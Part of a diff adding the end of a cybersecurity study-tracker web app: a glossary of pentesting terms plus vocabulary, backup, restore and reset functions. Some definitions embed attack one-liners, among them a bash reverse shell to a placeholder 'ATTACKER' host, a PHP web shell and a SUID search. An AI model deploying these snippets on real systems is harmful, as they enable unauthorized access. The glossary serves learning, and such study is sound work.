+    {id:913,term:'Defense Evasion',def:'Techniques to avoid detection: obfuscation, AMSI bypass, disabling logging, timestomping, clearing event logs.',cat:'general'},
+    {id:914,term:'AMSI Bypass',def:'Disabling Antimalware Scan Interface to run PowerShell without AV detection. Common bypass: patching amsi.dll in memory.',cat:'general'},
+    {id:915,term:'AppLocker Bypass',def:'Bypassing Windows application whitelisting. Common bypasses: LOLBAS binaries, script engines, DLLs not blocked.',cat:'general'},
+    {id:916,term:'UAC Bypass',def:'Bypassing User Account Control to escalate privileges without prompt. Methods: fodhelper, eventvwr, sdclt registry abuse.',cat:'general'},
+    {id:917,term:'DLL Hijacking',def:'Placing malicious DLL where application searches first. Missing DLLs in writeable paths. Tools: DLL Hijacking Scanner.',cat:'general'},
+    {id:918,term:'Unquoted Service Path',def:'Service binary paths without quotes allow placing malicious exe in path. e.g. C:\\Program Files\\target.exe.',cat:'general'},
+    {id:919,term:'Weak File Permissions',def:'Files/services writable by low-priv users. icacls or accesschk.exe to find. Replace binary or modify service config.',cat:'general'},
+    {id:920,term:'Sudo Abuse',def:'Exploiting sudo rules to escalate on Linux. sudo -l to list permissions. GTFOBins for sudo escape techniques.',cat:'general'},
+    {id:921,term:'SUID Abuse',def:'Files with SUID bit run as owner (often root). find / -perm -u=s -type f 2>/dev/null. GTFOBins for exploitation.',cat:'general'},
+    {id:922,term:'Cron Job Abuse',def:'Exploiting scheduled tasks running as root. Check /etc/crontab, /var/spool/cron, world-writable scripts in cron paths.',cat:'general'},
+    {id:923,term:'NFS Root Squash',def:'If no_root_squash set on NFS share, mount it and create SUID binary as root. Common Linux privesc vector.',cat:'general'},
+    {id:924,term:'Kernel Exploit',def:'Exploiting OS kernel vulnerabilities for root. Dirty COW (CVE-2016-5195), DirtyCred. Use uname -r to identify version.',cat:'general'},
+    {id:925,term:'GTFOBins',def:'List of Unix binaries that can bypass restrictions. gtfobins.github.io. Each binary has shell, file read, SUID, sudo escapes.',cat:'general'},
+    {id:926,term:'LOLBAS',def:'Living Off the Land Binaries, Scripts, Libraries. Windows signed binaries for code exec, download, bypass. lolbas-project.github.io.',cat:'general'},
+    {id:927,term:'Reverse Shell',def:'Target connects back to attacker. bash -i >& /dev/tcp/ATTACKER/4444 0>&1. Set up listener with nc -lvnp 4444.',cat:'general'},
+    {id:928,term:'Bind Shell',def:'Target opens listening port for attacker to connect to. Less common than reverse shell due to firewall restrictions.',cat:'general'},
+    {id:929,term:'Web Shell',def:'Script (PHP, ASPX, JSP) uploaded to web server giving command execution through browser. <?php system($_GET["cmd"]); ?>',cat:'general'},
+    {id:930,term:'Shell Upgrade',def:'Upgrading dumb TTY: python3 -c "import pty;pty.spawn(\'/bin/bash\')" then Ctrl+Z, stty raw -echo, fg, export TERM=xterm.',cat:'general'},
+    {id:931,term:'Wordlist',def:'File of potential passwords/directories for brute forcing. /usr/share/wordlists/rockyou.txt is the classic. SecLists on GitHub.',cat:'general'},
+    {id:932,term:'SecLists',def:'Daniel Miessler\'s massive wordlist collection. Passwords, usernames, URLs, fuzzing payloads, patterns. Essential for pentesting.',cat:'general'},
+    {id:933,term:'PTES',def:'Penetration Testing Execution Standard. 7 phases: pre-engagement, intel gathering, threat modeling, vuln analysis, exploitation, post-exploit, reporting.',cat:'general'},
+    {id:934,term:'Rules of Engagement',def:'Document defining pentest scope, allowed techniques, targets, timing, emergency contacts, and escalation procedures.',cat:'general'},
+    {id:935,term:'Scope Creep',def:'Testing systems outside the defined scope. Can be illegal even during authorized pentests. Always verify targets before testing.',cat:'general'},
+    {id:936,term:'Chain of Custody',def:'Documentation tracking evidence handling in forensic investigations. Critical for legal proceedings and incident response.',cat:'general'},
+    {id:937,term:'CVE',def:'Common Vulnerabilities and Exposures. Standardized identifiers for known vulnerabilities. CVE-YEAR-NUMBER format.',cat:'general'},
+    {id:938,term:'CVSS',def:'Common Vulnerability Scoring System. 0-10 score for severity. Base, Temporal, Environmental metrics. 7+ is high, 9+ is critical.',cat:'general'},
+    {id:939,term:'NVD',def:'National Vulnerability Database. US government repository of CVEs with CVSS scores, CWE mappings, and patch info.',cat:'general'},
+    {id:940,term:'Exploit-DB',def:'Public exploit archive at exploit-db.com. searchsploit tool for CLI searching. Maintained by Offensive Security.',cat:'general'},
+    {id:941,term:'Bug Bounty',def:'Programs paying researchers to find vulnerabilities. Platforms: HackerOne, Bugcrowd, Intigriti, Synack, YesWeHack.',cat:'general'},
+    {id:942,term:'Responsible Disclosure',def:'Reporting vulnerabilities to vendor privately before public disclosure. Standard is 90-day deadline (Google Project Zero standard).',cat:'general'},
+    {id:943,term:'Threat Modeling',def:'Systematic process to identify threats. STRIDE framework: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation.',cat:'general'},
+    {id:944,term:'Attack Surface',def:'All points where an attacker could try to enter or extract data. Minimize by disabling unused services, ports, and features.',cat:'general'},
+    {id:945,term:'Indicators of Compromise',def:'IOCs: artifacts indicating system compromise. IP addresses, domains, file hashes, registry keys, unusual processes.',cat:'general'},
+    {id:946,term:'Threat Intelligence',def:'Information about current threats. Tactical (TTPs), Operational (campaigns), Strategic (actor motives). Feeds: MISP, OpenCTI, AlienVault OTX.',cat:'general'},
+    {id:947,term:'Cyber Kill Chain',def:'Lockheed Martin 7-stage model: Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.',cat:'general'},
+    {id:948,term:'Purple Team',def:'Collaboration between red team (offense) and blue team (defense) to improve detection and response capabilities.',cat:'general'},
+    {id:949,term:'Threat Hunting',def:'Proactive search for threats already inside a network. Uses hypotheses, behavioral analytics, and IOCs to find hidden attackers.',cat:'general'},
+    {id:950,term:'SIEM',def:'Security Information and Event Management. Collects and correlates logs for detection. Products: Splunk, ELK, QRadar, Sentinel.',cat:'general'},
+    {id:951,term:'SOC',def:'Security Operations Center. Team monitoring security events 24/7. Tiers: L1 (alert triage), L2 (investigation), L3 (incident response).',cat:'general'},
+    {id:952,term:'EDR',def:'Endpoint Detection and Response. Next-gen AV that detects behavioral anomalies. Products: CrowdStrike Falcon, Carbon Black, SentinelOne.',cat:'general'},
+    {id:953,term:'SOAR',def:'Security Orchestration Automation and Response. Automates incident response playbooks. Reduces mean time to respond (MTTR).',cat:'general'},
+    {id:954,term:'Zero Trust',def:'Architecture assuming no implicit trust. Verify every user, device, request. "Never trust, always verify." Least privilege enforced.',cat:'general'},
+    {id:955,term:'Defense in Depth',def:'Multiple layered security controls. No single point of failure. Physical, network, host, application, data layers.',cat:'general'},
+    {id:956,term:'Patch Management',def:'Process of identifying, acquiring, and applying patches. Critical for reducing attack surface. Mean time to patch should be minimized.',cat:'general'},
+    {id:957,term:'Vulnerability Management',def:'Continuous process of identifying, classifying, remediating vulnerabilities. Tools: Nessus, OpenVAS, Qualys, Rapid7 InsightVM.',cat:'general'},
+    {id:958,term:'Penetration Testing',def:'Authorized simulated attack to identify vulnerabilities. Types: black box, white box, grey box. Report: findings, risk, remediation.',cat:'general'},
+    {id:959,term:'Red Team Exercise',def:'Full-scope adversary simulation against an org. Uses advanced TTPs, custom malware, physical access, social engineering.',cat:'general'},
+    {id:960,term:'Social Engineering',def:'Manipulating humans to reveal info or grant access. Phishing, vishing (voice), smishing (SMS), pretexting, baiting, tailgating.',cat:'general'},
+    {id:961,term:'Phishing',def:'Fraudulent emails tricking users into revealing credentials or installing malware. Spear phishing = targeted. Whaling = executives.',cat:'general'},
+    {id:962,term:'Vishing',def:'Voice phishing using phone calls. Impersonating IT support, banks, government. Often combined with email phishing campaigns.',cat:'general'},
+    {id:963,term:'Pretexting',def:'Creating a fabricated scenario to manipulate targets. e.g. pretending to be IT support to get credentials or access.',cat:'general'},
+    {id:964,term:'Tailgating',def:'Physically following authorized personnel through secure doors without credentials. Low-tech physical security bypass.',cat:'general'},
+    {id:965,term:'Wireless Attacks',def:'WEP cracking, WPA2 handshake capture, evil twin AP, KARMA attacks, deauth attacks. Tools: aircrack-ng, hostapd-wpe.',cat:'general'},
+    {id:966,term:'Evil Twin',def:'Rogue access point mimicking legitimate WiFi. Forces clients to connect, enabling MitM attacks. hostapd-wpe for WPA enterprise.',cat:'general'},
+    {id:967,term:'Deauth Attack',def:'Sending 802.11 deauthentication frames to disconnect clients from WiFi. Forces reconnection to capture WPA handshake.',cat:'general'},
+    {id:968,term:'DNS Spoofing',def:'Poisoning DNS cache to redirect domains to malicious IPs. Ettercap/dnsspoof for local network attacks.',cat:'general'},
+    {id:969,term:'ARP Spoofing',def:'Linking attacker MAC to victim IP, enabling MitM on local network. arpspoof, ettercap, bettercap tools.',cat:'general'},
+    {id:970,term:'MitM Attack',def:'Man in the Middle - intercepting communications between two parties. ARP spoofing, SSL stripping, evil twin AP.',cat:'general'},
+    {id:971,term:'SSL Stripping',def:'Downgrading HTTPS to HTTP by intercepting connections. Tool: sslstrip. Defeated by HSTS (HTTP Strict Transport Security).',cat:'general'},
+    {id:972,term:'DDoS',def:'Distributed Denial of Service - overwhelming target with traffic from many sources. Types: volumetric, protocol, application layer.',cat:'general'},
+    {id:973,term:'Exfiltration',def:'Covertly transferring stolen data outside network. Channels: DNS tunneling, ICMP, HTTP/S, email. Tools: dnscat2, iodine.',cat:'general'},
+    {id:974,term:'DNS Tunneling',def:'Encoding data in DNS queries for C2 or exfiltration. Hard to detect, bypasses many firewalls. Tools: dnscat2, iodine.',cat:'general'},
+    {id:975,term:'C2 (Command and Control)',def:'Infrastructure attackers use to communicate with compromised hosts. Protocols: HTTP/S, DNS, ICMP. Frameworks: Cobalt Strike, Havoc.',cat:'general'},
+    {id:976,term:'Beaconing',def:'Malware periodically checking in with C2 server. Jitter added to avoid detection. SOC hunts for beacon patterns in logs.',cat:'general'},
+    {id:977,term:'Cobalt Strike',def:'Commercial red team C2 framework. Beacon payload, teamserver, malleable C2 profiles. Most mimicked in real-world APT attacks.',cat:'general'},
+    {id:978,term:'APT',def:'Advanced Persistent Threat - sophisticated, long-term nation-state or organized group attack. Examples: APT28, Lazarus Group.',cat:'general'},
+    {id:979,term:'Supply Chain Attack',def:'Compromising software vendor/build process to attack downstream users. Examples: SolarWinds, 3CX, XZ Utils backdoor.',cat:'general'},
+    {id:980,term:'Watering Hole Attack',def:'Compromising websites frequently visited by target group. Deliver drive-by downloads or credential harvesting to specific targets.',cat:'general'},
+    {id:981,term:'Insider Threat',def:'Malicious or negligent employee/contractor causing security incidents. Hardest to detect due to authorized access.',cat:'general'},
+    {id:982,term:'Physical Security',def:'Locks, badges, cameras, guards, mantraps. Pen testers test badge cloning, tailgating, lock picking, dumpster diving.',cat:'general'},
+    {id:983,term:'RFID Cloning',def:'Copying access card data using Proxmark3 or Flipper Zero. Then use clone for unauthorized physical access.',cat:'general'},
+    {id:984,term:'Flipper Zero',def:'Portable multi-tool for security testing. Sub-GHz, RFID/NFC, IR, BadUSB, GPIO. Used in wireless and physical pentests.',cat:'general'},
+    {id:985,term:'BadUSB',def:'USB device firmware attack. USB acts as keyboard to execute commands. Rubber Ducky, Bash Bunny by Hak5. O.MG Cable.',cat:'general'},
+    {id:986,term:'Rubber Ducky',def:'USB HID attack tool by Hak5. Looks like USB drive but types as keyboard at 1000 WPM. DuckyScript payloads.',cat:'general'},
+    {id:987,term:'Dumpster Diving',def:'Searching physical trash for sensitive documents, hardware, credentials. Organizations should shred all documents.',cat:'general'},
+    {id:988,term:'OSINT',def:'Open Source Intelligence gathering. LinkedIn, GitHub, WHOIS, Shodan, Google dorks, social media, breach databases.',cat:'general'},
+    {id:989,term:'Google Dorks',def:'Advanced Google search operators to find exposed files, login pages, vulnerabilities. site:, filetype:, inurl:, intitle: operators.',cat:'general'},
+    {id:990,term:'Shodan Dorks',def:'Shodan search filters: port:, country:, org:, product:, vuln:. Find exposed cameras, RDP, industrial systems worldwide.',cat:'general'},
+    {id:991,term:'WHOIS',def:'Domain registration data lookup. Reveals registrant, nameservers, registration dates. Privacy guards often used now.',cat:'general'},
+    {id:992,term:'Passive Recon',def:'Intelligence gathering without touching target systems. OSINT, WHOIS, DNS lookups, Shodan, LinkedIn. No IDS alerts.',cat:'general'},
+    {id:993,term:'Active Recon',def:'Directly probing target systems: port scans, service enumeration, web crawling. Can trigger IDS/IPS alerts.',cat:'general'},
+    {id:994,term:'Footprinting',def:'First phase of ethical hacking - mapping attack surface. Find IPs, domains, emails, tech stack, employees before testing.',cat:'general'},
+    {id:995,term:'Enumeration',def:'Extracting detailed information from discovered services: usernames, shares, banners, versions. More targeted than scanning.',cat:'general'},
+    {id:996,term:'Exploitation',def:'Using discovered vulnerabilities to gain unauthorized access. Goal: obtain shell, credentials, or sensitive data.',cat:'general'},
+    {id:997,term:'Post-Exploitation',def:'Actions after gaining access: enumerate, escalate, persist, pivot, exfiltrate. PTES phase after initial exploitation.',cat:'general'},
+    {id:998,term:'Report Writing',def:'Documenting pentest findings: executive summary (risk), technical findings (CVSS score, steps to reproduce, evidence, remediation).',cat:'general'},
+    {id:999,term:'Scope of Work',def:'Legal contract defining what is authorized during a pentest. Includes target IPs, allowed tools, timing windows, emergency contacts.',cat:'general'},
+    {id:1000,term:'Ethical Hacking',def:'Authorized security testing to find vulnerabilities before attackers do. Requires written permission, defined scope, and professional conduct.',cat:'general'},
+  ];
+}
+function saveVocab() {
+  const term = document.getElementById('vocabTerm').value.trim();
+  const def = document.getElementById('vocabDef').value.trim();
+  if (!term||!def) { toast('> both fields required','#ff4d6d'); return; }
+  store.vocab.unshift({ id:Date.now(), term, def, cat:document.getElementById('vocabCat').value });
+  save(); closeModal('vocabModal'); renderVocab(); toast('> TERM SAVED');
+}
+function renderVocab() {
+  const q = (document.getElementById('vocabSearch').value||'').toLowerCase();
+  const cat = document.getElementById('vocabCatFilter').value;
+  let items = store.vocab;
+  if (cat !== 'all') items = items.filter(function(v){ return v.cat===cat; });
+  if (q) items = items.filter(function(v){ return v.term.toLowerCase().includes(q) || v.def.toLowerCase().includes(q); });
+  const catColors = {web:'tag-red',networking:'tag-blue',linux:'tag-green',tools:'tag-gold',general:'tag-blue',crypto:'tag-gold',forensics:'tag-green',malware:'tag-red'};
+  const grid = document.getElementById('vocabGrid');
+  if (!items.length) { grid.innerHTML='<div class="empty-state" style="grid-column:1/-1"><div class="empty-icon">📖</div>NO TERMS FOUND</div>'; return; }
+  grid.innerHTML = items.map(function(v){ return '<div class="vocab-card"><div class="vocab-term">' + escH(v.term) + '</div><div class="vocab-def">' + escH(v.def) + '</div><div class="vocab-cat" style="display:flex;justify-content:space-between;align-items:center;"><span class="tag ' + (catColors[v.cat]||'tag-blue') + '">' + v.cat.toUpperCase() + '</span><button class="icon-btn" style="font-size:11px;" onclick="deleteVocab(' + v.id + ')">🗑</button></div></div>'; }).join('');
+}
+function deleteVocab(id) {
+  store.vocab = store.vocab.filter(function(v){ return v.id!==id; });
+  save(); renderVocab(); toast('> TERM REMOVED','#ff4d6d');
+}
+
+// =================== BACKUP & RESTORE ===================
+function backupData() {
+  const backup = JSON.parse(JSON.stringify(store));
+  backup._backup_date = new Date().toISOString();
+  backup._version = '1.0';
+  const blob = new Blob([JSON.stringify(backup, null, 2)], { type:'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'cyberbase-backup-' + new Date().toISOString().split('T')[0] + '.json';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(a.href);
+  toast('> BACKUP DOWNLOADED');
+}
+function restoreData(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    try {
+      const data = JSON.parse(e.target.result);
+      if (!data.notes && !data.habits && !data.ctf) { toast('> INVALID BACKUP FILE','#ff4d6d'); return; }
+      if (data.notes) store.notes = data.notes;
+      if (data.habits) store.habits = data.habits;
+      if (data.ctf) store.ctf = data.ctf;
+      if (data.vocab) store.vocab = data.vocab;
+      if (data.pomoLog) store.pomoLog = data.pomoLog;
+      if (data.roadmaps) store.roadmaps = data.roadmaps;
+      save();
+      renderNotes(); renderHabits(); renderCTF(); renderVocab(); renderPomoLog(); renderRoadmapList();
+      toast('> BACKUP RESTORED - ALL DATA LOADED');
+    } catch(err) { toast('> ERROR: Could not read file','#ff4d6d'); }
+  };
+  reader.readAsText(file);
+  event.target.value = '';
+}
+
+function resetPomoLog() {
+  if (!confirm('Clear all pomodoro session logs?')) return;
+  store.pomoLog = [];
+  pomoState.session = 0;
+  const sesEl = document.getElementById('pomoSession');
+  if (sesEl) sesEl.textContent = 'SESSION #0';
+  save(); renderPomoLog(); toast('> POMO LOG CLEARED','#ff4d6d');
+}
+
+function resetAllData() {
+  if (!confirm('⚠ RESET EVERYTHING? All notes, habits, CTF logs, vocab, and pomodoro data will be wiped. This cannot be undone.')) return;
+  localStorage.removeItem('cyberbase');
+  store = { notes:[], habits:[], ctf:[], vocab: getDefaultVocab(), pomoLog:[], roadmaps:[] };
+  pomoState.session = 0;
+  pomoState.running = false;
+  pomoState.mode = 'focus';
+  pomoState.timeLeft = 25*60;
+  clearInterval(pomoState.interval);
+  save();
+  renderNotes(); renderHabits(); renderCTF(); renderVocab(); renderPomoLog(); renderRoadmapList(); updatePomoDisplay();
+  const sesEl = document.getElementById('pomoSession');
+  if (sesEl) sesEl.textContent = 'SESSION #0';
+  const btn = document.getElementById('pomoPlayBtn');
+  if (btn) btn.innerHTML = '▶';
+  toast('> ALL DATA RESET','#ff4d6d');
+}
+
+
+load();
+renderNotes();
+renderHabits();
+renderCTF();
+renderVocab();
+renderPomoLog();
+renderRoadmapList();
+updatePomoDisplay();
+
+if (store.habits.length === 0) {
+  store.habits = [
+    { id:1, name:'Daily TryHackMe / PortSwigger', cat:'cyber', streak:0, best:0, history:[], lastDone:null },
+    { id:2, name:'Typing Practice (keybr/monkeytype)', cat:'practice', streak:0, best:0, history:[], lastDone:null },
+    { id:3, name:'Read / Watch English Content', cat:'study', streak:0, best:0, history:[], lastDone:null },
+    { id:4, name:'Write Blog Post / Writeup', cat:'cyber', streak:0, best:0, history:[], lastDone:null },
+  ];
+  save(); renderHabits();
+}
+
+</script>
+</body>
+</html>
